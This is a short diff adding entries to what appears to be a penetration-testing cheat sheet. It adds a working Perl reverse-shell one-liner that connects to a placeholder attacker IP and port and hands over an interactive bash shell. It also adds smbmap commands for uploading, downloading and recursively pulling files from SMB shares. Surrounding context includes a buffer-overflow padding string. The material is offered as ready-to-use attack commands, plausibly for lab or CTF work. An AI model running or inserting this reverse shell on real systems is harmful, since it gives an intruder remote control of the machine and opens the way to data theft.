@@ -2371,6 +2371,9 @@ pandoc -s -o out_file_here.pdf mardown_file_here.md
 ```perl
 # generate string of 20 A + concatenate with ABCD
 $(perl -e 'print "\x41" x 20 . "ABCD"')
+
+# reverse shell
+perl -e 'use Socket;$i="attacker_IP_here";$p=port_here;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
 ```
 
 
@@ -3154,8 +3157,17 @@ smbclient \\\\IP_here\\some_share -D some_folder -U username%password
 # smbclient - upload file
 put /path/to/local/file [/path/remote]
 
+# upload file
+smbmap -R share_here -H IP_here --upload /path/to/file
+
+# download file
+smbmap -R share_here -H IP_here --download /path/to/file
+
 # smbclient - download file
 get /path/to/remote/file
+
+# recursiveley download files
+smbmap -R share_name_here -H IP_here -A '.*'
 
 # smbclient - bulk download every file on share
 mask ""
